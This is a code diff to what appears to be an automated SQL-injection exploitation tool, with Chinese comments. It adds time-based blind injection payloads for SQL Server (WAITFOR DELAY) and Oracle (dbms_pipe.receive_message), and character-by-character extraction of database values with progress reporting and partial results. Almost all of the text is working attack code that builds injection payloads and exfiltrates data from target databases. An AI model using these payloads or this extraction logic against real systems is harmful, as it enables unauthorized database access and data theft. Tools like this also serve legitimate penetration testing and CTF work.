@@ -18,8 +18,10 @@ from app.services.prober import _build_request, _elapsed, _is_waf_block
 
 _SEC = 2
 _GREY_LOW = 0.4
-_ASCII_FN = {"postgresql": "ascii", "mysql": "ascii", "sqlite": "unicode"}
-_SUBSTR_FN = {"postgresql": "substring", "mysql": "substring", "sqlite": "substr"}
+_ASCII_FN = {"postgresql": "ascii", "mysql": "ascii", "sqlite": "unicode",
+             "mssql": "ascii", "oracle": "ascii"}
+_SUBSTR_FN = {"postgresql": "substring", "mysql": "substring", "sqlite": "substr",
+              "mssql": "substring", "oracle": "substr"}
 
 
 def normalize_dbms(dbms: str) -> str:
@@ -30,6 +32,10 @@ def normalize_dbms(dbms: str) -> str:
         return "mysql"
     if "sqlite" in d:
         return "sqlite"
+    if "microsoft" in d or "mssql" in d or "sql server" in d:
+        return "mssql"
+    if "oracle" in d:
+        return "oracle"
     return d
 
 
@@ -52,6 +58,12 @@ def build_payload(base: str, cond: str, dbms: str, *, quote: str = "'",
                 f"IS NOT NULL ELSE FALSE END")
     elif dbms == "mysql":
         body = f"IF(({cond}), SLEEP({sec}), 0)"
+    elif dbms == "mssql":
+        # SQL Server 时间盲注标准形态；堆叠被禁时也可能失败，失败即由上层标记
+        body = f"CASE WHEN ({cond}) THEN 1 ELSE 0 END; WAITFOR DELAY '0:0:{sec}'"
+    elif dbms == "oracle":
+        body = (f"CASE WHEN ({cond}) THEN dbms_pipe.receive_message(('x'), {sec}) "
+                f"ELSE 1 END")
     else:
         return None
     payload = f"{base}{quote} AND {body}-- -"
@@ -139,7 +151,8 @@ class _Prober:
                 hi = mid
         return lo
 
-    def extract_string(self, expr: str, max_len: int = 32) -> str | None:
+    def extract_string(self, expr: str, max_len: int = 32, progress_cb=None) -> str | None:
+        self.partial = False
         self.baseline = self._measure_baseline()
         if self.error:
             return None
@@ -150,28 +163,40 @@ class _Prober:
         for i in range(1, length + 1):
             cp = self.extract_int(lambda m: _cond(expr, i, ">", m, self.dbms), 31, 127)
             if cp is None or not (31 <= cp <= 126):
+                # 只有显式要进度（深挖定向提取）时才返回部分结果；
+                # 其余调用方（flag/列清单提取）保持原来的 None 语义，避免把残缺值当完整值。
+                if progress_cb and out:
+                    self.partial = True
+                    return "".join(out)
                 return None
             out.append(chr(cp))
+            # 每提取一个字符就回调一次，供上层实时汇报（预算用尽也能看到部分结果）
+            if progress_cb:
+                try:
+                    progress_cb("".join(out))
+                except Exception:
+                    pass
         return "".join(out)
 
 
 def extract_scalar(client, endpoint, param: str, base_value, dbms: str, expr: str,
                    *, slash_first: bool = False, max_len: int = 32,
                    quote: str = "'", sec: int = _SEC,
-                   deadline: float | None = None) -> dict:
+                   deadline: float | None = None, progress_cb=None) -> dict:
     """提取标量字符串（如 current_database()）。
 
     返回 {value, requests, error}。value 为空字符串表示条件成立但不可见。
     quote：注入语境闭合符（由已确认 payload 反推）；sec：单次 sleep 秒数。
     """
     nd = normalize_dbms(dbms)
-    if nd not in ("postgresql", "mysql"):
+    if nd not in ("postgresql", "mysql", "mssql", "oracle"):
         return {"value": None, "requests": 0,
                 "error": f"unsupported dbms for time extraction: {dbms}"}
     prober = _Prober(client, endpoint, param, base_value, nd, slash_first=slash_first,
                      quote=quote, sec=sec, deadline=deadline)
-    value = prober.extract_string(expr, max_len=max_len)
-    return {"value": value, "requests": prober.requests, "error": prober.error}
+    value = prober.extract_string(expr, max_len=max_len, progress_cb=progress_cb)
+    return {"value": value, "requests": prober.requests, "error": prober.error,
+            "partial": getattr(prober, "partial", False)}
 
 
 # 表/列名清单一次性取回（MySQL）：concat 用 0x3a 冒号连接，group_concat 默认逗号分隔。
